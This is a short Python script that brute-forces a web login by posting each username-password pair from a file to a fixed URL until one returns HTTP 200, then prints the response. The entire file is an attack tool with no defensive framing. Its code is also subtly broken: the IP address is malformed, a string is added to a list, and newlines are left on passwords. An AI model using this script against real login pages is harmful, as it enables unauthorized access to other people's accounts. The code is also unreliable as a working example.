import sys
import requests

url = 'http://10.1.101/login'

login_file = 'login.txt'

with open(login_file) as fp:
    for i, cred in enumerate(fp):
        entry= cred.split("-")
        payload = {"userName": entry[0], "password": entry[1]}
        r = requests.post(url, data=payload)
        print("{}: {}".format(str(payload), r.status_code))
        if r.status_code == 200:
            print("Successful login: " + entry)
            print(r.content)
            fp.close()
            exit()


print("No successful login found!")